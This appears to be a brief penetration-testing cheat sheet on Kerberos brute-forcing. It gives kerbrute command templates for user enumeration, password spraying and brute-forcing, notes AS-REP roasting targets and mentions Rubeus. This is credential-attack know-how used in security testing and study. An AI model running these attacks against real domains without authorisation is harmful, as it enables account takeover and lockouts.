# Kerberos Brute-force
Careful for locking out accounts.
Can find user accounts with 'UF_DONT_REQUIRE_PREAUTH' set, for a AS-REP Roasting attack.
`kerbrute <COMMAND> --dc <IP> -d <DOMAIN> <OPTIONS>`
bruteforce - user:password combos
passwordspray -  Password for list users 
userenum - Users
`kerbrute bruteuser -d <DOMAIN> --dc <IP> <PASSLIST> <USER>` bruteuser (passwords for user)


`Rubeus` (with brute module)